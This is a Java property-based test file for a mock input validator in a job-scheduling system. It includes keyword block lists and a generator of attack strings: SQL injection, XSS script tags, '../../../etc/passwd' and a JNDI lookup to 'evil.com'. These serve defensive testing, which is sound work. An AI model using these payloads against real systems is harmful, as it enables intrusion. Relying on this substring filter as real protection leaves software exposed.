package com.alyx.jobscheduler;

import net.java.quickcheck.Generator;
import net.java.quickcheck.QuickCheck;
import net.java.quickcheck.characteristic.AbstractCharacteristic;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

import static net.java.quickcheck.generator.PrimitiveGenerators.*;

/**
 * Property-based test for data validation effectiveness
 * **Feature: alyx-system-fix, Property 13: Data validation effectiveness**
 * **Validates: Requirements 6.3**
 */
public class DataValidationEffectivenessPropertyTest {

    /**
     * Mock data validator implementation for testing
     */
    static class MockDataValidator {
        
        public static class ValidationResult {
            private final boolean isValid;
            private final String errorMessage;
            
            public ValidationResult(boolean isValid, String errorMessage) {
                this.isValid = isValid;
                this.errorMessage = errorMessage;
            }
            
            public boolean isValid() { return isValid; }
            public String getErrorMessage() { return errorMessage; }
        }
        
        public ValidationResult validateJobParameters(Map<String, Object> parameters) {
            if (parameters == null) {
                return new ValidationResult(false, "Parameters cannot be null");
            }
            
            // Check required fields
            if (!parameters.containsKey("jobName") || parameters.get("jobName") == null) {
                return new ValidationResult(false, "Job name is required");
            }
            
            String jobName = parameters.get("jobName").toString();
            if (jobName.trim().isEmpty()) {
                return new ValidationResult(false, "Job name cannot be empty");
            }
            
            if (jobName.length() > 100) {
                return new ValidationResult(false, "Job name too long (max 100 characters)");
            }
            
            // Check expected events
            if (parameters.containsKey("expectedEvents")) {
                Object expectedEventsObj = parameters.get("expectedEvents");
                if (expectedEventsObj instanceof Number) {
                    int expectedEvents = ((Number) expectedEventsObj).intValue();
                    if (expectedEvents <= 0) {
                        return new ValidationResult(false, "Expected events must be positive");
                    }
                    if (expectedEvents > 1000000) {
                        return new ValidationResult(false, "Expected events too large (max 1,000,000)");
                    }
                } else {
                    return new ValidationResult(false, "Expected events must be a number");
                }
            }
            
            // Check energy threshold
            if (parameters.containsKey("energyThreshold")) {
                Object energyThresholdObj = parameters.get("energyThreshold");
                if (energyThresholdObj instanceof Number) {
                    double energyThreshold = ((Number) energyThresholdObj).doubleValue();
                    if (energyThreshold < 0) {
                        return new ValidationResult(false, "Energy threshold cannot be negative");
                    }
                    if (energyThreshold > 1000.0) {
                        return new ValidationResult(false, "Energy threshold too high (max 1000.0)");
                    }
                } else {
                    return new ValidationResult(false, "Energy threshold must be a number");
                }
            }
            
            // Check for SQL injection patterns
            String jobNameStr = jobName.toLowerCase();
            if (jobNameStr.contains("drop table") || jobNameStr.contains("delete from") || 
                jobNameStr.contains("insert into") || jobNameStr.contains("update ") ||
                jobNameStr.contains("select ") || jobNameStr.contains("union ") ||
                jobNameStr.contains("--") || jobNameStr.contains("/*") ||
                jobNameStr.contains("' or ") || jobNameStr.contains("'='") ||
                jobNameStr.contains("1=1") || jobNameStr.contains("or 1=1")) {
                return new ValidationResult(false, "Job name contains potentially malicious content");
            }
            
            // Check for XSS patterns
            if (jobNameStr.contains("<script") || jobNameStr.contains("javascript:") ||
                jobNameStr.contains("onload=") || jobNameStr.contains("onerror=")) {
                return new ValidationResult(false, "Job name contains potentially malicious script content");
            }
            
            // Check for JNDI injection patterns
            if (jobName.contains("${jndi:") || jobName.contains("${ldap:") || 
                jobName.contains("${rmi:") || jobName.contains("${dns:")) {
                return new ValidationResult(false, "Job name contains potentially malicious content");
            }
            
            // Check for template injection patterns
            if (jobName.contains("{{") || jobName.contains("<%=") || 
                jobName.contains("eval(") || jobName.contains("${")) {
                return new ValidationResult(false, "Job name contains potentially malicious content");
            }
            
            // Check for path traversal patterns
            if (jobName.contains("../") || jobName.contains("..\\") || 
                jobName.contains("/etc/") || jobName.contains("\\windows\\")) {
                return new ValidationResult(false, "Job name contains potentially malicious content");
            }
            
            return new ValidationResult(true, null);
        }
        
        public ValidationResult validateCollisionEventData(Map<String, Object> eventData) {
            if (eventData == null) {
                return new ValidationResult(false, "Event data cannot be null");
            }
            
            // Check required fields for collision event
            if (!eventData.containsKey("eventId") || eventData.get("eventId") == null) {
                return new ValidationResult(false, "Event ID is required");
            }
            
            // Validate event ID format
            String eventId = eventData.get("eventId").toString();
            if (!eventId.matches("^[a-zA-Z0-9_-]+$")) {
                return new ValidationResult(false, "Event ID contains invalid characters");
            }
            
            // Check timestamp
            if (eventData.containsKey("timestamp")) {
                Object timestampObj = eventData.get("timestamp");
                if (timestampObj instanceof Number) {
                    long timestamp = ((Number) timestampObj).longValue();
                    long currentTime = System.currentTimeMillis();
                    if (timestamp > currentTime + 86400000) { // Future by more than 1 day
                        return new ValidationResult(false, "Timestamp cannot be too far in the future");
                    }
                    if (timestamp < currentTime - 31536000000L) { // Older than 1 year
                        return new ValidationResult(false, "Timestamp cannot be too old");
                    }
                } else {
                    return new ValidationResult(false, "Timestamp must be a number");
                }
            }
            
            // Check particle count
            if (eventData.containsKey("particleCount")) {
                Object particleCountObj = eventData.get("particleCount");
                if (particleCountObj instanceof Number) {
                    int particleCount = ((Number) particleCountObj).intValue();
                    if (particleCount < 0) {
                        return new ValidationResult(false, "Particle count cannot be negative");
                    }
                    if (particleCount > 10000) {
                        return new ValidationResult(false, "Particle count too high (max 10,000)");
                    }
                } else {
                    return new ValidationResult(false, "Particle count must be a number");
                }
            }
            
            return new ValidationResult(true, null);
        }
    }

    /**
     * Generator for valid job parameters
     */
    private static final Generator<Map<String, Object>> validJobParametersGenerator() {
        return new Generator<Map<String, Object>>() {
            @Override
            public Map<String, Object> next() {
                Map<String, Object> params = new HashMap<>();
                // Generate safe job names with only alphanumeric characters, hyphens, and underscores
                String jobName = "job_" + strings(5, 20).next().replaceAll("[^a-zA-Z0-9_-]", "");
                if (jobName.length() < 5) {
                    jobName = "job_test_" + integers(1, 1000).next();
                }
                params.put("jobName", jobName);
                params.put("expectedEvents", integers(1, 100000).next());
                params.put("energyThreshold", doubles(0.1, 500.0).next());
                params.put("description", "Test description for job analysis");
                return params;
            }
        };
    }

    /**
     * Generator for invalid job parameters
     */
    private static final Generator<Map<String, Object>> invalidJobParametersGenerator() {
        return new Generator<Map<String, Object>>() {
            @Override
            public Map<String, Object> next() {
                Map<String, Object> params = new HashMap<>();
                
                // Randomly choose what makes it invalid
                int invalidType = integers(0, 6).next();
                
                switch (invalidType) {
                    case 0: // Null job name
                        params.put("jobName", null);
                        break;
                    case 1: // Empty job name
                        params.put("jobName", "");
                        break;
                    case 2: // Too long job name
                        params.put("jobName", strings(101, 200).next());
                        break;
                    case 3: // Negative expected events
                        params.put("jobName", "valid-job");
                        params.put("expectedEvents", integers(-1000, -1).next());
                        break;
                    case 4: // Too large expected events
                        params.put("jobName", "valid-job");
                        params.put("expectedEvents", integers(1000001, 2000000).next());
                        break;
                    case 5: // Negative energy threshold
                        params.put("jobName", "valid-job");
                        params.put("energyThreshold", doubles(-100.0, -0.1).next());
                        break;
                    case 6: // SQL injection attempt
                        params.put("jobName", "DROP TABLE users; --");
                        break;
                }
                
                return params;
            }
        };
    }

    @Test
    void testDataValidationEffectivenessForValidData() {
        // **Feature: alyx-system-fix, Property 13: Data validation effectiveness**
        QuickCheck.forAll(validJobParametersGenerator(), 
            new AbstractCharacteristic<Map<String, Object>>() {
                @Override
                protected void doSpecify(Map<String, Object> validParams) throws Throwable {
                    MockDataValidator validator = new MockDataValidator();
                    MockDataValidator.ValidationResult result = validator.validateJobParameters(validParams);
                    
                    // Property: Valid data should pass validation
                    assert result.isValid() : 
                        "Valid parameters should pass validation. Error: " + result.getErrorMessage();
                    assert result.getErrorMessage() == null : 
                        "Valid parameters should not have error message";
                }
            });
    }

    @Test
    void testDataValidationEffectivenessForInvalidData() {
        QuickCheck.forAll(invalidJobParametersGenerator(), 
            new AbstractCharacteristic<Map<String, Object>>() {
                @Override
                protected void doSpecify(Map<String, Object> invalidParams) throws Throwable {
                    MockDataValidator validator = new MockDataValidator();
                    MockDataValidator.ValidationResult result = validator.validateJobParameters(invalidParams);
                    
                    // Property: Invalid data should be rejected
                    assert !result.isValid() : 
                        "Invalid parameters should be rejected. Params: " + invalidParams;
                    assert result.getErrorMessage() != null : 
                        "Invalid parameters should have error message";
                    assert !result.getErrorMessage().trim().isEmpty() : 
                        "Error message should not be empty";
                }
            });
    }

    /**
     * Generator for collision event data validation scenarios
     */
    private static final Generator<Object[]> collisionEventScenarioGenerator() {
        return new Generator<Object[]>() {
            @Override
            public Object[] next() {
                Map<String, Object> eventData = new HashMap<>();
                boolean shouldBeValid = booleans().next();
                
                if (shouldBeValid) {
                    // Generate valid event data
                    eventData.put("eventId", "event_" + strings(5, 20).next().replaceAll("[^a-zA-Z0-9_-]", ""));
                    eventData.put("timestamp", System.currentTimeMillis() - integers(0, 86400000).next());
                    eventData.put("particleCount", integers(1, 1000).next());
                } else {
                    // Generate invalid event data
                    int invalidType = integers(0, 4).next();
                    switch (invalidType) {
                        case 0: // Missing event ID
                            eventData.put("timestamp", System.currentTimeMillis());
                            break;
                        case 1: // Invalid event ID characters
                            eventData.put("eventId", "event<script>alert('xss')</script>");
                            break;
                        case 2: // Future timestamp
                            eventData.put("eventId", "valid_event_123");
                            eventData.put("timestamp", System.currentTimeMillis() + 172800000); // 2 days future
                            break;
                        case 3: // Negative particle count
                            eventData.put("eventId", "valid_event_123");
                            eventData.put("particleCount", integers(-1000, -1).next());
                            break;
                        case 4: // Too high particle count
                            eventData.put("eventId", "valid_event_123");
                            eventData.put("particleCount", integers(10001, 50000).next());
                            break;
                    }
                }
                
                return new Object[]{eventData, shouldBeValid};
            }
        };
    }

    @Test
    void testCollisionEventDataValidation() {
        QuickCheck.forAll(collisionEventScenarioGenerator(), 
            new AbstractCharacteristic<Object[]>() {
                @Override
                protected void doSpecify(Object[] args) throws Throwable {
                    @SuppressWarnings("unchecked")
                    Map<String, Object> eventData = (Map<String, Object>) args[0];
                    Boolean shouldBeValid = (Boolean) args[1];
                    
                    MockDataValidator validator = new MockDataValidator();
                    MockDataValidator.ValidationResult result = validator.validateCollisionEventData(eventData);
                    
                    // Property: Validation result should match expected validity
                    if (shouldBeValid) {
                        assert result.isValid() : 
                            "Valid event data should pass validation. Error: " + result.getErrorMessage();
                    } else {
                        assert !result.isValid() : 
                            "Invalid event data should be rejected. Data: " + eventData;
                        assert result.getErrorMessage() != null : 
                            "Invalid data should have error message";
                    }
                }
            });
    }

    /**
     * Generator for malicious input scenarios
     */
    private static final Generator<String> maliciousInputGenerator() {
        return new Generator<String>() {
            @Override
            public String next() {
                String[] maliciousPatterns = {
                    "DROP TABLE users; --",
                    "'; DELETE FROM jobs; --",
                    "<script>alert('xss')</script>",
                    "javascript:alert('xss')",
                    "onload=alert('xss')",
                    "UNION SELECT * FROM passwords",
                    "1' OR '1'='1",
                    "../../../etc/passwd",
                    "${jndi:ldap://evil.com/a}",
                    "{{7*7}}",
                    "<%=7*7%>",
                    "eval('alert(1)')"
                };
                
                return maliciousPatterns[integers(0, maliciousPatterns.length - 1).next()];
            }
        };
    }

    @Test
    void testMaliciousInputDetection() {
        QuickCheck.forAll(maliciousInputGenerator(), 
            new AbstractCharacteristic<String>() {
                @Override
                protected void doSpecify(String maliciousInput) throws Throwable {
                    MockDataValidator validator = new MockDataValidator();
                    
                    Map<String, Object> params = new HashMap<>();
                    params.put("jobName", maliciousInput);
                    params.put("expectedEvents", 100);
                    
                    MockDataValidator.ValidationResult result = validator.validateJobParameters(params);
                    
                    // Property: Malicious input should be detected and rejected
                    assert !result.isValid() : 
                        "Malicious input should be rejected: " + maliciousInput;
                    assert result.getErrorMessage() != null : 
                        "Malicious input should have error message";
                    assert result.getErrorMessage().toLowerCase().contains("malicious") : 
                        "Error message should indicate malicious content for: " + maliciousInput;
                }
            });
    }

    @Test
    void testDataValidationBasicFunctionality() {
        MockDataValidator validator = new MockDataValidator();
        
        // Test valid parameters
        Map<String, Object> validParams = new HashMap<>();
        validParams.put("jobName", "test-job");
        validParams.put("expectedEvents", 1000);
        validParams.put("energyThreshold", 10.5);
        
        MockDataValidator.ValidationResult result = validator.validateJobParameters(validParams);
        assert result.isValid();
        assert result.getErrorMessage() == null;
        
        // Test invalid parameters (null job name)
        Map<String, Object> invalidParams = new HashMap<>();
        invalidParams.put("jobName", null);
        
        result = validator.validateJobParameters(invalidParams);
        assert !result.isValid();
        assert result.getErrorMessage() != null;
        
        // Test SQL injection
        Map<String, Object> sqlInjectionParams = new HashMap<>();
        sqlInjectionParams.put("jobName", "DROP TABLE users");
        
        result = validator.validateJobParameters(sqlInjectionParams);
        assert !result.isValid();
        assert result.getErrorMessage().contains("malicious");
    }
}